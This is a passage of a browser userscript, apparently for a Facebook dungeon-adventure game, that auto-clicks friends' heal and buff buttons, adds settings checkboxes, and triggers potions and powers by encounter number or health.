			tcht.innerHTML = GM_getValue(myfbid + "tchealtot")
			

}

}

function heallooper() {


}

// ------------------------------------




// ------------------------------------

function buffClicker() {

bufftest = GM_getValue(myfbid + "tcbufftest")

 	

if (bufftest != "" && bufftest != null) {
	var bix = document.getElementsByTagName('img');	
	var tcb = document.getElementById("tc_buff_msg");	
	buffloop = bufftest.split(','); 
	bufflen = buffloop.length;

 	

		buffme = buffloop[bufflen-1];

 	
		
//		bufftest = bufftest.replace(buffme,":");	
		// click an image in FF -----
	   	var bevt = document.createEvent('MouseEvents'); 	
	 	bevt.initMouseEvent('click', true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null); 
	 	var cbb = bix[buffme]; 
	 	var canceled = !cbb.dispatchEvent(bevt); 
		// ------

 		buffloop.pop();	
		bufftest = buffloop.join(",");	
 	

 		GM_setValue(myfbid + "tcbufftest",bufftest)
 		tcb.innerHTML = "Buffing " + (bufflen); 

			var btotx = GM_getValue(myfbid + "tcbufftot");
			btotx += 1;
			GM_setValue(myfbid + "tcbufftot",btotx);
			var tcbt = document.getElementById("tc_buff_tot");	
			tcbt.innerHTML = GM_getValue(myfbid + "tcbufftot")

}
}

function bufflooper() {

}


function friendSettings() {

//	alert("starting friend check")
	
	var frc = document.getElementsByTagName('td');	
	var frcx = frc.length; 
	var frcloop = "0"; 
		for (fr=0; fr<frcx; fr++) { 
			if (frc[fr].style.width.search('186px')!=-1) { 

			// find player id
				var frdisp = frc[fr].innerHTML
				var frid = frdisp
				frid = frid.replace (/\<div(.*)profile.php\?id\=/g, "" )
			 	frid = frid.replace (/\"(.*)/g, "" )
 				frid = frid.replace (/\<(.*)/g, "" )

				var strLen = frid.length; 
				frid = frid.slice(0,strLen-1); 
					
			// set global value if none exists (default on)		
	 
			var fridgetheal = "heal" + frid;
			var fridgetbuff = "buff" + frid;

			var frhealchk = GM_getValue(myfbid + fridgetheal)
			if (frhealchk == null) {
				GM_setValue(myfbid + fridgetheal,"on")	
			} 
			var frbuffchk = GM_getValue(myfbid + fridgetbuff)
			if (frbuffchk == null) {
				GM_setValue(myfbid + fridgetbuff,"on")	
			} 

			var frhealset = GM_getValue(myfbid + fridgetheal)
			var frbuffset = GM_getValue(myfbid + fridgetbuff)		
			
			// check to see if the friend is on the skip list

			if (skipcheck == "ON") {
				var hskp = checkhealstatus(frid)
				var bskp = checkbuffstatus(frid)
			} else {
				var hskp = "heal"
				var bskp = "buff"
			}

			// if global value set to off then change image so it cant be clicked automatically				
			
			if (frbuffset == "off" || bskp == "skip") {		
				imgchange = frc[fr].parentNode.nextSibling.nextSibling.innerHTML
				if (frc[fr].parentNode.nextSibling.nextSibling.innerHTML.search('Buff.png')!=-1) { 
			 		imgchange = imgchange.replace ("http://2974.voxcdn.com/ta/WebGraphics/Buttons/Buff.png", tcimgbuff2 + "\" id='tc_b_" + frid + "_img'" )
	 		 		frc[fr].parentNode.nextSibling.nextSibling.innerHTML = imgchange
				}
				var frbuffchecked = ""
			} else {
				var frbuffchecked = "CHECKED"
			}
			
			if (frhealset == "off" || hskp == "skip") {				
				imgchange = frc[fr].parentNode.nextSibling.nextSibling.innerHTML
				if (frc[fr].parentNode.nextSibling.nextSibling.innerHTML.search('GetWell.gif')!=-1) { 
			 		imgchange = imgchange.replace ("http://2974.voxcdn.com/ta/WebGraphics/Buttons/GetWell.gif", tcimggetwell2 + "\" id='tc_h_" + frid + "_img'" )
	 		 		frc[fr].parentNode.nextSibling.nextSibling.innerHTML = imgchange
				}
				var frhealchecked = ""
			} else {
				var frhealchecked = "CHECKED"
			}

			
			var frdisp = "";
			
			if (hskp != "skip") {
				frdisp += "<span id='tc_" + frid + "_heal' style='text-align: left; width: 20px; height: 20px;'><input id='tc_" + frid + "_healchk' onclick='tcfrheal(" + frid + ")' type='checkbox' " + frhealchecked + "/></span><span style='font-size: 9px; vertical-align:text-top'> Heal</span>&nbsp;&nbsp;" 
			} else {
				frdisp += "<span id='tc_" + frid + "_heal_skip' style='text-align: left; width: 20px; height: 20px;'>&nbsp;<img id='tc_" + frid + "_healchk' src='" + tcno + "'/>&nbsp;</span><span style='font-size: 9px; color: red; vertical-align:text-top'> Heal</span>&nbsp;&nbsp;" 
			}
			
			if (bskp != "skip") {
				frdisp += "<span id='tc_" + frid + "_buff' style='text-align: left; width: 20px; height: 20px;'><input id='tc_" + frid + "_buffchk' onclick='tcfrbuff(" + frid + ")' type='checkbox' " + frbuffchecked + "/></span><span style='font-size: 9px; vertical-align:text-top'> Buff</span>"
			} else {
				frdisp += "<span id='tc_" + frid + "_buff_skip' style='text-align: left; width: 20px; height: 20px;'>&nbsp;<img id='tc_" + frid + "_buffchk' src='" + tcno + "'/>&nbsp;</span><span style='font-size: 9px; color: red; vertical-align:text-top'> Buff</span>"
			}



//  + frid + "<br/>" + fridgetheal + "/" + frhealset + "<br/>" + fridgetbuff + "/" + frbuffset  

				frc[fr].innerHTML = frdisp + frc[fr].innerHTML

				if (hskp != "skip") {				
					elfrheal = document.getElementById("tc_" + frid + "_healchk"); 
					elfrheal.addEventListener("click", elfrheal2, false); 				
				}
				
				if (bskp != "skip") {				
					elfrbuff = document.getElementById("tc_" + frid + "_buffchk"); 
					elfrbuff.addEventListener("click", elfrbuff2, false); 						
				}
				
		 	}
		} 	



}

function elfrheal2() {
	var fridx = readCookie2(myfbid + "tcfrid")
	var fridxheal = "heal" + fridx;
	var fridxchk = GM_getValue(myfbid + fridxheal)
		if (fridxchk == "on") {
			GM_setValue(myfbid + fridxheal,"off")	
		} else {
			GM_setValue(myfbid + fridxheal,"on")	
		} 	

//alert(fridxheal + " " + fridxchk)		
		
}

function elfrbuff2() {
	var fridx = readCookie2(myfbid + "tcfrid")
	var fridxbuff = "buff" + fridx;
	var fridxchk = GM_getValue(myfbid + fridxbuff)
		if (fridxchk == "on") {
			GM_setValue(myfbid + fridxbuff,"off")	
		} else {
			GM_setValue(myfbid + fridxbuff,"on")	
		} 	

//alert(fridxbuff + " " + GM_getValue(myfbid + fridxbuff))		
		
}


// ====================================================================
// ====== View Rewards ================================================
// ====================================================================

function viewRewards() {  
	ccc = document.getElementsByTagName("td");	
	for (xg=0; xg<xgen.length; xg++) {		
		gg = xgen[xg];
		cccloop = 0
		for (cw=1; cw<ccc.length; cw++) {	
 			if (ccc[cw].innerHTML.search("<b>" + gg + "</b>")!=-1 && ccc[cw].innerHTML.search("xp20.png")==-1 ) {
				cccloop = cw
			}	
 		}
		zzz = xrewards[xg]; 
		ccc[cccloop+1].innerHTML = zzz
	}
}

// Related Functions ---------------------------

function addRewardPowers() {  
	ccc = document.getElementsByTagName("td");	
	for (xg=0; xg<xgen.length; xg++) {		
		gg = xgen[xg];
		cccloop = 0;
		for (cw=1; cw<ccc.length; cw++) {	
 			if (ccc[cw].innerHTML.search("<b>" + gg + "</b>")!=-1 && gg == 3) {
				cccloop = cw
			}
 		}
		zzz = xrewards[xg]; 
	    zzz += "<div style='font-size: 10px; width: 445px; margin-left: 15px;'>" + power1 + "</div>"
		ccc[cccloop+1].innerHTML = zzz
	}
	for (xg=0; xg<xgen.length; xg++) {		
		gg = xgen[xg];
		cccloop = 0;
		for (cw=1; cw<ccc.length; cw++) {	
 			if (ccc[cw].innerHTML.search("<b>" + gg + "</b>")!=-1 && gg == 10) {
				cccloop = cw
			}
 		}
		zzz = xrewards[xg]; 
	    zzz += "<div style='font-size: 10px; width: 445px; margin-left: 15px;'>" + power2 + "</div>"
		ccc[cccloop+1].innerHTML = zzz
	}	
}

// ====================================================================
// ====== View Shop ===================================================
// ====================================================================

function viewTheShop() {
	cf = document.getElementsByTagName("div");	
    comploopf = 0;	
 	for (ww=1; ww<cf.length; ww++) {	
 		if (cf[ww].innerHTML.search("WelcomToTheStore.gif")!=-1) {
 			comploopf = ww;
 		}	
 	}
 
 
 	var storedisp = "<br/>" + chardivs		

	cf[comploopf].innerHTML += storedisp

	fillCharInfo();
	
		
	 
} 


// ====================================================================
// ====== View Inventory ==============================================
// ====================================================================

function viewInventory() {
	cx = document.getElementsByTagName("Table");	
    comploop = 0;	
	for (v=1; v<cx.length; v++) {	
		if (cx[v].innerHTML.search("Potions:")!=-1) {
			comploop = v;
		}	 
	}
	xx =  cx[comploop].innerHTML
	xx = xx.replace (/popupid/g, "popupid1000");	
 	xx = xx.replace (/\div\s*onmouseover=\"(.*)\"/g, "<div onmouseover=\"\"" )
 	xx = xx.replace (/\div\s*onmouseout=\"(.*)\"/g, "<div onmouseout=\"\"" )
} 

// ====================================================================
// ====== View Adventure ==============================================
// ====================================================================

function viewAdventure() {
	for (v=3; v<=20; v++) {	
		vv = v + "";
		bx = "app23415053320_popupid" + vv;
		cx = document.getElementById(bx);	
		if (cx != "" && cx != null) { 
			viewAdvSummary(bx);
		}
	}
	
 
} 

// Related Functions ------------------------------

function viewAdvSummary(did) {
	var d = document.getElementById(did).nextSibling.nextSibling;
if (d != null) {
	
	
	var x = d.innerHTML;
	var advlen = (adv.length);
	var advdisp = "";
  	for (i=0; i<advlen; i++) {	   	
		if (x.search(adv[i])!=-1) {
			advname = adv[i];
			var advenc = aenc[i];	      
			var advsplit = advenc.split("#");      
			var advsplitlen = (advsplit.length);        	
			GM_setValue(myfbid + "tcadvlenx", advsplitlen);		
			for (q=0; q<advsplitlen; q++) {
				ss = (q + " / " + advsplitlen); 
				sss = (q + "/" + advsplitlen); 
				if (d.innerHTML.search(ss)!=-1) { 
 					GM_setValue(myfbid + "tcadvtxt", sss);
		 		}
				// shortened by 1 because of "nightmare bug or power"
				ssx = (q + " / " + (advsplitlen - 1)); 
				if (d.innerHTML.search(ssx)!=-1) { 
 					GM_setValue(myfbid + "tcadvtxt", ssx);
	 		}
	   	}

	
		    advdisp1 = "<tr><td colspan=2>" + chardivs + "</td></tr>"
	
		    advdisp2 = "<tr><td colspan=2><table cellpadding='2' cellspacing='0' border='0' style='border: 1px solid black; background-color: #ffffcc; width: 595px;'><tr><td>" + makeSummaryHtml(advname) + "</td></tr></table></td></tr>";

		    advdisp3 = "<tr><td colspan=2><table cellpadding='2' cellspacing='0' border='0' style='border: 1px solid black; background-color: #ffffcc; width: 595px;'><tr><td><span id='treasure_chest_potion_window'></span></td></tr></table></td></tr>";

			d.innerHTML = advdisp1 + d.innerHTML + advdisp2 + advdisp3; 

	 
fillCharInfo();

			//setTimeout(potionTrigger,1000);
			 potionTrigger();
		}
	}
	

} // if d not null
}
 
// Related Functions ------------------------------
 
function potionTrigger() {	

	xencc = 0;	
	xencc = GM_getValue(myfbid + "tcadvtxt");
	xencc = xencc.replace (/\/.*/, "");
	xencc = parseFloat(xencc) + 1;
	triggerenc = xencc;

	xhget = GM_getValue(myfbid + "tchealth");	
	xhsplit = xhget.split("/")
	xhcurrent = xhsplit[0]
	xhmax = xhsplit[1]
	xlevel = GM_getValue(myfbid + "tclevel");		
	var hvalmaster = 0;	
	if (xlevel <= 4) {
		hvalmaster = "15";
	} else {
		hvalmaster = "25";
	}
	// get cleric "yes" "no" 	
	xcleric = GM_getValue(myfbid + "tccleric");		
	// set usage colors
	p1color = "silver"
	p2color = "silver"
	w1color = "silver"
	w2color = "silver"
	p1testheal = "";
	p2testheal = "";
	// check to see if a potion slot has a potion in it	
	pix = document.getElementsByName("uselootslot");	
	pixx = pix.length
	p1ex = "no"
	p2ex = "no"
	for (p=0; p<pixx; p++) {		
		pxv = pix[p].value;
		if (pxv == 1) {
			p1ex = "yes"
			p1color = "lime"
				p1testheal = pix[p].parentNode.parentNode.parentNode
		} else {
			p1ex = "no"
		}
		if (pxv == 2) {
			p2ex = "yes"
			p2color = "lime"
				p2testheal = pix[p].parentNode.parentNode.parentNode
			//	alert(cixa.innerHTML)					
			
		} else {
			p2ex = "no"
		}
	}
	var pots = readCookie2(myfbid + 'tcpotchk')
	// no pot number set ... check to see how many equipped and set cookie
	if (pots == null) {
		pots = 0
		if (p1ex == "yes" && p2ex == "yes") {
			pots = 2
		} else {
			if (p1ex == "yes" || p2ex == "yes") {
				pots = 1
			}
		}
	}
	createCookie2(myfbid + 'tcpotchk',pots,1)
	cix = document.getElementsByTagName("Input");	
    cixx = cix.length
	xpot1 = 0;	
	xpot2 = 0;	
	xpower1 = 0;
	xpower2 = 0;

	var qpot = 0;
	var qpx = "";
	for (q=0; q<cixx; q++) {	
		if (cix[q].src.search("UsePotion.gif")!=-1) {
			if (qpot == 0) { 
				qpot = 1
				xpot1 = q
				cix[q].id = "tc_input_potion_1" 
			} else {
				xpot2 = q 
				cix[q].id = "tc_input_potion_2" 
			} 	
		}	
		if (cix[q].src.search("Power_1.png")!=-1) {
			xpower1 = q	
			cix[q].id = "tc_input_power_1" 
			w1color = "lime"
		}	
		if (cix[q].src.search("Power_2.png")!=-1) {
			xpower1 = q	
			cix[q].id = "tc_input_power_2" 
			w2color = "lime"
		}	
	}
	// check the element by id now and see if the image matches one of the two to set them on or off
	var wchk1 = document.getElementById("tc_input_potion_1");		
	var wchk2 = document.getElementById("tc_input_potion_2");		
	// check for potion type ... if healing set the display to heal	
	// and set the health to heal at to 25 or half of max health 
	// need to write code to capture max health 
	// Potion of Healing 20
	// Elixir of Vitality 40
	// Elixir of Recovery 60
	
	// Set the label for 
	var whenp1 = "enc";

	if (p1testheal.innerHTML != null && p1testheal.innerHTML !="") { 
		if (p1testheal.innerHTML.search("Potion of Healing")!=-1) {
			whenp1 = "heal"
		}
		if (p1testheal.innerHTML.search("Elixir of Vitality")!=-1) {
			whenp1 = "heal"
		}
		if (p1testheal.innerHTML.search("Elixir of Recovery")!=-1) {
			whenp1 = "heal"
		}
	}
 
var whenp2 = "enc";

if (p2testheal.innerHTML != null && p2testheal.innerHTML !="") { 
	if (p2testheal.innerHTML.search("Potion of Healing")!=-1) {
		whenp2 = "heal"
	}
	if (p2testheal.innerHTML.search("Elixir of Vitality")!=-1) {
		whenp2 = "heal"
	}
	if (p2testheal.innerHTML.search("Elixir of Recovery")!=-1) {
		whenp2 = "heal"
	}
} 

var whenw1 = "enc";

if (xcleric == "yes") {
	whenw1 = "heal";
}


var whenw2 = "enc";



// If used toggle the checkbox off

if (p1color != "lime") {
	createCookie2(myfbid + 'tcpot1toggle','0',1);
}	 
if (p2color != "lime") {
	createCookie2(myfbid + 'tcpot2toggle','0',1);
}	 
if (w1color != "lime") {
	createCookie2(myfbid + 'tcpow1toggle','0',1); 
}	 
if (w2color != "lime") {
	createCookie2(myfbid + 'tcpow2toggle','0',1); 
}	 



// pot 1 display 
 
var tcp1 = readCookie2(myfbid + 'tcpot1toggle')
if (tcp1 == 1) {
	var tcp1value = "CHECKED";
} else {
	var tcp1value = "";
}		

var tcp1v = readCookie2(myfbid + 'tcpot1value')
var tcp1text = ""
if (tcp1v != "0" && tcp1v != null) {
	 tcp1text = tcp1v;
} else {
	if (whenp1 == "heal") {
	 	tcp1text = hvalmaster;
	} 
}	 

	var pot1box = "<table border='0' cellpadding='0' cellspacing='0' align='right'><tr><td></td><td></td><td style='font-size: 9px; text-align: center; width: 20px;'>" + whenp1 + "</td><td style='font-size: 9px; text-align: center; width: 20px;'>use</td></tr><tr><td><div id='treasure_chest_potion_1_box' style='width:4px; height: 4px; border: 1px solid black;'></div></td><td style='width: 43px; text-align: right; font-size: 9px; margin-top: 0px;'>Potion 1:&nbsp;</td><td ><input id='tc_pot_1_text' onKeyUp='javascript:tcpot1value()' type='textbox' maxlength='3' size='3' value='" + tcp1text + "' style='width: 20px; height: 11px; font-size: 9px; border: 1px solid black; text-align: center; padding:0; margin-top: 0px; margin-bottom: 1px;'/></td><td ><input id='tc_pot_1_check' onclick='javascript:tcpot1toggle()' type='checkbox' style='margin-top: 1px; margin-bottom: 0px;' " + tcp1value + "/></td></tr></table>";

// pot 2 display 

var tcp2 = readCookie2(myfbid + 'tcpot2toggle')
if (tcp2 == 1) {
	var tcp2value = "CHECKED";
} else {
	var tcp2value = "";
}

var tcp2v = readCookie2(myfbid + 'tcpot2value')
tcp2text = "";
if (tcp2v != "0" && tcp2v != null) {
	tcp2text = tcp2v;
} else {
	if (whenp2 == "heal") {
		tcp2text = hvalmaster;
	} 
}	



	var pot2box = "<table border='0' cellpadding='0' cellspacing='0' align='right'><tr><td></td><td></td><td style='font-size: 9px; text-align: center; width: 20px;'>" + whenp2 + "</td><td style='font-size: 9px; text-align: center; width: 20px;'>use</td></tr><tr><td><div id='treasure_chest_potion_2_box' style='width:4px; height: 4px; border: 1px solid black;'></div></td><td style='width: 43px; text-align: right; font-size: 9px; margin-top: 0px;'>Potion 2:&nbsp;</td><td ><input id='tc_pot_2_text' onKeyUp='javascript:tcpot2value()' type='textbox' maxlength='3' size='3' value='" + tcp2text + "' style='width: 20px; height: 11px; font-size: 9px; border: 1px solid black; text-align: center; padding:0; margin-top: 0px; margin-bottom: 1px;'/></td><td ><input id='tc_pot_1_check' onclick='javascript:tcpot2toggle()' type='checkbox' style='margin-top: 1px; margin-bottom: 0px;' " + tcp2value + "/></td></tr></table>";     

// pow 1 display 


var tcw1 = readCookie2(myfbid + 'tcpow1toggle')
if (tcw1 == 1) {
	var tcw1value = "CHECKED";
} else {
	var tcw1value = "";
}	

var tcw1v = readCookie2(myfbid + 'tcpow1value')
var tcw1text = "";
if (tcw1v != "0" && tcw1v != null) {
	tcw1text = tcw1v;
} else {
	if (xcleric == "yes") { 
		tcw1text = 10 + (parseInt(xlevel) * 2);
	}
}	

// Cleric - Lesser Healing: Heals yourself for 4 HP plus 2 HP per level (6 HP at 1st level, 8 at 2nd, etc.)

	var pow1box = "<table border='0' cellpadding='0' cellspacing='0' align='right'><tr><td></td><td></td><td style='font-size: 9px; text-align: center; width: 20px;'>" + whenw1 + "</td><td style='font-size: 9px; text-align: center; width: 20px;'>use</td></tr><tr><td><div id='treasure_chest_power_1_box' style='width:4px; height: 4px; border: 1px solid black;'></div></td><td style='width: 43px; text-align: right; font-size: 9px; margin-top: 0px;'>Power 1:&nbsp;</td><td ><input id='tc_pow_1_text' onKeyUp='javascript:tcpow1value()' type='textbox' maxlength='3' size='3' value='" + tcw1text + "' style='width: 20px; height: 11px; font-size: 9px; border: 1px solid black; text-align: center; padding:0; margin-top: 0px; margin-bottom: 1px;'/></td><td ><input id='tc_pot_1_check' onclick='javascript:tcpow1toggle()' type='checkbox' style='margin-top: 1px; margin-bottom: 0px;' " + tcw1value + "/></td></tr></table>";   	 

// pow 2 display 

var tcw2 = readCookie2(myfbid + 'tcpow2toggle')
if (tcw2 == 1) {
	var tcw2value = "CHECKED";
} else {
	var tcw2value = "";
}

var tcw2v = readCookie2(myfbid + 'tcpow2value')
var tcw2text = "";
if (tcw2v != "0" && tcw2v != null) {
	tcw2text = tcw2v;
} 

// Paladin - Celestial Charger: Gallop past the next encounter. (Skips the next encounter.)

// Ranger - Quickdraw: Restock your potions mid-adventure. (Equip two new potions during your adventure. Currently bugged, it retains the original 2 checkbox options and does not reset them to match the new potions selected. i.e. healing potion might say 'use before 7th encounter' instead of 'use when < 25hp'))

	var pow2box = "<table border='0' cellpadding='0' cellspacing='0' align='right'><tr><td></td><td></td><td style='font-size: 9px; text-align: center; width: 20px;'>" + whenw2 + "</td><td style='font-size: 9px; text-align: center; width: 20px;'>use</td></tr><tr><td><div id='treasure_chest_power_2_box' style='width:4px; height: 4px; border: 1px solid black;'></div></td><td style='width: 43px; text-align: right; font-size: 9px; margin-top: 0px;'>Power 2:&nbsp;</td><td ><input id='tc_pow_2_text' onKeyUp='javascript:tcpow2value()' type='textbox' maxlength='3' size='3' value='" + tcw2text + "' style='width: 20px; height: 11px; font-size: 9px; border: 1px solid black; text-align: center; padding:0; margin-top: 0px; margin-bottom: 1px;'/></td><td ><input id='tc_pot_1_check' onclick='javascript:tcpow2toggle()' type='checkbox' style='margin-top: 1px; margin-bottom: 0px;' " + tcw2value + "/></td></tr></table>"; 
	
// potion and powers display 
  
var pwin = document.getElementById("treasure_chest_potion_window");
 
	 pwin.innerHTML = "<b>Automated Potions & Powers</b><br/><table border='0' cellpadding='0' cellspacing='1'><tr><td width='100px'>" + pot1box + "</td><td width='100px'>" + pot2box + "</td><td rowspan='2' valign='top' width='380px'><div id='treasure_chest_auto_text' style='font-size: 9px; margin-left: 14px; margin-top: 7px;'>To auto use a potion or power enter the encounter you wish them to trigger in the box then click the checkbox. For healing potions enter the health at which you wish to use the healing potion. A green box indicates an available potion or power. Additional information about potion and power auto use will appear here in future updates.</div></td></tr><tr><td width='100px'>" + pow1box + "</td><td width='100px'>" + pow2box + "</td></tr></table>"

 	pt1 = document.getElementById("treasure_chest_potion_1_box");  
	pt1.style.backgroundColor = p1color;	 
	 
 	pt2 = document.getElementById("treasure_chest_potion_2_box");  
	pt2.style.backgroundColor = p2color;	 
	 
 	wt1 = document.getElementById("treasure_chest_power_1_box");  
	wt1.style.backgroundColor = w1color;	 
	 
 	wt2 = document.getElementById("treasure_chest_power_2_box");  
	wt2.style.backgroundColor = w2color;	

// select drink and drink it 


 var xdrinkme = "";

// set triggers


// this is where we test to click power 2
if (triggerenc == tcw2text && tcw2value == "CHECKED" && whenw2 == "enc" && w2color == "lime") {
	xdrinkme = "tc_input_power_2";
}

if (xcleric == "no") {
	// this is where we test to click power 1 for everyone not clerics
	if (parseInt(triggerenc) == parseInt(tcw1text) && tcw1value == "CHECKED" && whenw1 == "enc" && w1color == "lime") {
		xdrinkme = "tc_input_power_1";
	}
}



// this is where we test to click potion 2 ... encounter type potion trigger
if (whenp2 == "enc") { 
	if (parseInt(triggerenc) == parseInt(tcp2text) && tcp2value == "CHECKED" && p2color == "lime") {
		if (p1color == "lime") {
			xdrinkme = "tc_input_potion_2";
		} else {
			xdrinkme = "tc_input_potion_1";
		}
	}
} else {
	// this is where we test to click potion 2 ... healing type potion trigger
	if (parseInt(xhcurrent) <= parseInt(tcp2text) && tcp2value == "CHECKED" && p2color == "lime") {
		if (p1color == "lime") {
			xdrinkme = ";tc_input_potion_2";
		} else {
			xdrinkme = "tc_input_potion_1";
		}
	}
}



// this is where we test to click potion 1 ... encounter type potion trigger
if (whenp1 == "enc" ) { 
	if (parseInt(triggerenc) == parseInt(tcp1text) && tcp1value == "CHECKED" && p1color == "lime") {
		xdrinkme = "tc_input_potion_1";		
	}
} else {
// this is where we test to click potion 1 ... healing type potion trigger
	if (parseInt(xhcurrent) <= parseInt(tcp1text) && tcp1value == "CHECKED" && p1color == "lime") {
		xdrinkme = "tc_input_potion_1";
	}
}	





if (xcleric == "yes") {
	// this is where we test to click power 1 for clerics
	if (parseInt(xhcurrent) <= parseInt(tcw1text) && tcw1value == "CHECKED" && whenw1 == "heal" && w1color == "lime") {
		xdrinkme = "tc_input_power_1";
	}
}







GM_setValue(myfbid + "tcdrinknow",xdrinkme)

drinkNow()
	
	
}	



	
// ---------------------------------------------





function drinkNow() {	

	// drink the potion or activate the power
	var xtthis = GM_getValue(myfbid + "tcdrinknow")
	GM_setValue(myfbid + "tcdrinknow","")
	if (xtthis != null && xtthis != "") {
		document.getElementById(xtthis).click();
		window.location.reload(true);
	}
}
		
	
// ====================================================================
// ====== New View Adventure ==========================================
// ====================================================================

	  
	  
function viewNewAdventure() {	

// remove specific warning
/* 
  	dix = document.getElementsByTagName("div");	
 	dlen = dix.length
	var dx = ""
	for (dd=0; dd<dlen; dd++) {	
		if (dix[dd].innerHTML.search("aware of the bug")!=-1) {
			dx = dd
		}
		if (dix[dd].innerHTML.search("UPDATE:")!=-1) {
			dx = dd
		}
	} 
	dix[dx].innerHTML = ""
	dix[dx].removeNode(true)
*/ 
// 
 		
 
 
  	c = document.getElementsByTagName("img");	
 	clen = c.length
	var mx = ""
	for (m=0; m<clen; m++) {	
		if (c[m].src.search("http://2974.voxcdn.com/ta/WebGraphics/Environments/Small/")!=-1) {
			mx = mx + ":" + m + ":"; 
//			makeSummary(m)
		}
	} 
	mx = mx.replace(/\:\:/g,','); 
	mx = mx.replace(/\:/g,''); 
	mx = mx.split(",")
	mxlen = mx.length

	for (x=0; x<mxlen; x++) {	
//		alert(c[mx[x]].parentNode.parentNode.innerHTML)
		makeSummary(mx[x])
	} 
// http://2974.voxcdn.com/ta/WebGraphics/Environments/Small/

 
	var classtype = "???";		
	c = document.getElementById("app23415053320_popupid1");	
	if (c != "" && c != null) { checkClass("app23415053320_popupid1") }	


/*
	c = document.getElementById("app23415053320_popupid2");
	if (c != "" && c != null) { makeSummary("app23415053320_popupid2") }	
	c = document.getElementById("app23415053320_popupid3");	
	if (c != "" && c != null) { makeSummary("app23415053320_popupid3") }	
	c = document.getElementById("app23415053320_popupid4");	
	if (c != "" && c != null) { makeSummary("app23415053320_popupid4") }	
	c = document.getElementById("app23415053320_popupid5");	
	if (c != "" && c != null) { makeSummary("app23415053320_popupid5") }	
	c = document.getElementById("app23415053320_popupid6");	
	if (c != "" && c != null) { makeSummary("app23415053320_popupid6") }
	c = document.getElementById("app23415053320_popupid7");	
	if (c != "" && c != null) { makeSummary("app23415053320_popupid7") }
 */
 
 fillCharInfo();
 
}


// ====================================================================
// ===== Functions ====================================================
// ====================================================================

function embedFunction(s) {
document.body.appendChild(document.createElement('script')).innerHTML=s.toString().replace(/([\s\S]*?return;){2}([\s\S]*)}/,'$2');
}



// --------------------------------------------------------------------

function tcpot1toggle2() { 
	var p1 = readCookie2(myfbid + 'tcpot1toggle'); 
	if (p1 == 1) { 
		createCookie2(myfbid + 'tcpot1toggle','0',1);
	} else { 
		createCookie2(myfbid + 'tcpot1toggle','1',1);
	}
	return;
}    

// --------------------------------------------------------------------

function tcpot2toggle2() { 
	var p2 = readCookie2(myfbid + 'tcpot2toggle');
	if (p2 == 1) { 
		createCookie2(myfbid + 'tcpot2toggle','0',1);
	} else { 
		createCookie2(myfbid + 'tcpot2toggle','1',1);
	}
	return;
}   
 
// --------------------------------------------------------------------

function tcpow1toggle2() { 
	var w1 = readCookie2(myfbid + 'tcpow1toggle'); 
	if (w1 == 1) { 
		createCookie2(myfbid + 'tcpow1toggle','0',1); 
	} else { 
		createCookie2(myfbid + 'tcpow1toggle','1',1);
	}
	return;
}  

// --------------------------------------------------------------------

function tcpow2toggle2() { 
	var w2 = readCookie2(myfbid + 'tcpow2toggle'); 
	if (w2 == 1) { 
		createCookie2(myfbid + 'tcpow2toggle','0',1); 
	} else { 
		createCookie2(myfbid + 'tcpow2toggle','1',1);
	}
	return;
}   



// --------------------------------------------------------------------

function createCookie2(name,value,days)
{
	if (days)
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

// --------------------------------------------------------------------

function readCookie2(name)
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++)
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

// --------------------------------------------------------------------

function eraseCookie2(name)
{
	createCookie2(name,"",-1);
}
 
// --------------------------------------------------------------------

// --------------------------------------------------------------------
// Check Terrain Type

function terrainWikiLink(enctype) {
	var elink = ""
	if (enctype == 'C') {
		elink = "<a href='http://dndta.wikia.com/wiki/Castle' target='_blank'>" 
	} 
	if (enctype == 'D') {
		elink = "<a href='http://dndta.wikia.com/wiki/Dungeon' target='_blank'>" 
	} 	
	if (enctype == 'F') {
		elink = "<a href='http://dndta.wikia.com/wiki/Forest' target='_blank'>" 
	} 
	if (enctype == 'G') {
		elink = "<a href='http://dndta.wikia.com/wiki/Graveyard' target='_blank'>" 
	} 
	if (enctype == 'L') {
		elink = "<a href='http://dndta.wikia.com/wiki/Lake' target='_blank'>" 
	} 
	if (enctype == 'M') {
		elink = "<a href='http://dndta.wikia.com/wiki/Mountain' target='_blank'>" 
	} 
	if (enctype == 'S') {
		elink = "<a href='http://dndta.wikia.com/wiki/Swamp' target='_blank'>" 
	} 
	if (enctype == 'T') {
		elink = "<a href='http://dndta.wikia.com/wiki/Temple' target='_blank'>" 
	} 						
	return elink;
}

// http://dndta.wikia.com/wiki/ 
// C  * Castle   
// D  * Dungeon
// F  * Forest
// G  * Graveyard
// L  * Lake
// M  * Mountain
// S  * Swamp
// T  * Temple

// --------------------------------------------------------------------

function terrainWikiLink2(enctype) {
	var elink = ""
	if (enctype == 'C' || enctype == 'D' || enctype == 'F' || enctype == 'G' || enctype == 'L' || enctype == 'M' || enctype == 'S' || enctype == 'T') {
		elink = "</a>" 
	} 
	return elink;
}

// --------------------------------------------------------------------

function checkTerrain(enctype) {	
	var advenc = "";	
	var xencsplitlen = (xenc.length)	
	for (m=0; m<xencsplitlen; m++) {	    
		var xencsplit = xenc[m].split("#");	    
			if (xencsplit[0] == enctype) {		
				advenc = "<span style='color: #838383'><br/>" + xencsplit[1] + "<br/>" + xencsplit[2] + "</span>";	    
			}
	}
	return  advenc
}

// --------------------------------------------------------------------
// Make Summary

function makeSummary(cid) {  
//	var d = document.getElementById(cid);  
//	var n = d.nextSibling;  
//	var x = n.innerHTML;      

	var d = document.getElementsByTagName("img");	 
// 	alert(d[cid].src);

	var n = d[cid].parentNode.parentNode.parentNode;
// 	alert(n.innerHTML);

	var x = n.innerHTML;      
 	var z = d[cid].parentNode.nextSibling.innerHTML;
 
//	alert(x);

	var advname = "";  
	var advwiki = "";  	
	var advid = "";  
	var displayme = "no";    
	var advlen = (adv.length);    
	for (i=0; i<advlen; i++) {    
		if (z.search(adv[i])!=-1) {      
			displayme = "yes"	
			var advid = i;      
			var advname = adv[i];	
			var advwiki = wiki[i];      
			var advenc = aenc[i];	            
			var advsplit = advenc.split("#");      
			var advsplitlen = (advsplit.length);            
